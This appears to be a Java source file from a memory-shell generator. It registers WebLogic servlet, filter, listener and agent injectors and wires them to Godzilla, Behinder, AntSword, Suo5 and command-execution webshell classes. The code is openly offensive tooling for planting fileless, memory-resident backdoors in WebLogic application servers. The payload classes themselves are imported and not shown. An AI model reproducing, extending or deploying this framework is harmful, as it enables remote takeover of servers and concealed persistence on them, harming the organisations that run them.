package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.generator.ListenerGenerator;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordServlet;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderServlet;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Servlet;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicFilterInjector;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicListenerInjector;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicServletContextAgentInjector;
import com.reajason.javaweb.memshell.weblogic.injector.WebLogicServletInjector;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/24
 */
public class WebLogicShell extends AbstractShell {

    @Override
    protected InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(SERVLET, WebLogicServletInjector.class)
                .addInjector(FILTER, WebLogicFilterInjector.class)
                .addInjector(LISTENER, WebLogicListenerInjector.class)
                .addInjector(WEBLOGIC_AGENT_SERVLET_CONTEXT, WebLogicServletContextAgentInjector.class)
                .build();
    }

    @Override
    protected void init() {
        addToolMapping(ShellTool.Command, ToolMapping.builder()
                .addShellClass(SERVLET, CommandServlet.class)
                .addShellClass(FILTER, CommandFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Command))
                .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, CommandFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                .addShellClass(SERVLET, GodzillaServlet.class)
                .addShellClass(FILTER, GodzillaFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Godzilla))
                .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, GodzillaFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                .addShellClass(SERVLET, BehinderServlet.class)
                .addShellClass(FILTER, BehinderFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Behinder))
                .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, BehinderFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Suo5, ToolMapping.builder()
                .addShellClass(SERVLET, Suo5Servlet.class)
                .addShellClass(FILTER, Suo5Filter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Suo5))
                .build());

        addToolMapping(ShellTool.AntSword, ToolMapping.builder()
                .addShellClass(SERVLET, AntSwordServlet.class)
                .addShellClass(FILTER, AntSwordFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.AntSword))
                .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, AntSwordFilterChainAdvisor.class)
                .build());
    }
}
